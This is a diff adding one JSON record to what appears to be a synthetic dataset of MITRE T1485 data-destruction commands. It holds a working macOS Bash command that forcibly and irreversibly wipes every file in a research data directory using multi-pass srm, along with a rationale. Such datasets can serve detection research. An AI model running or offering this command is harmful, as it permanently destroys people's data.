@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "find \"/Users/research/Data/Experiment_2025\" -type f -exec srm -fm {} +",
+  "explanation": "Irreversibly destroys all files within a specific research dataset using forced, multi-pass secure deletion.",
+  "rationale_steps": [
+    "Target a single experiment directory to focus destruction.",
+    "Enumerate files with find to avoid unintended directory removal.",
+    "Apply srm with -m for 7-pass overwrite and -f to force deletion without prompts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-6cdf8ad5",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
